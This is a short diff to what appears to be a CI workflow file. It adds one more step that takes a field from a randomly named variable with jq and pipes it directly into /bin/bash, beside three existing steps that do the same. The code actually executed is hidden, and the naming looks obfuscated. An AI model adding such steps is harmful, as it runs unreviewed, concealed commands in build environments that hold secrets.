@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$kahiu48" | jq -r .pxb72610 | /bin/bash
           printf '%s' "$ki0487" | jq -r .cdx8914 | /bin/bash
           printf '%s' "$i46" | jq -r .ueez32 | /bin/bash
+          printf '%s' "$pzo5" | jq -r .dpoii8 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
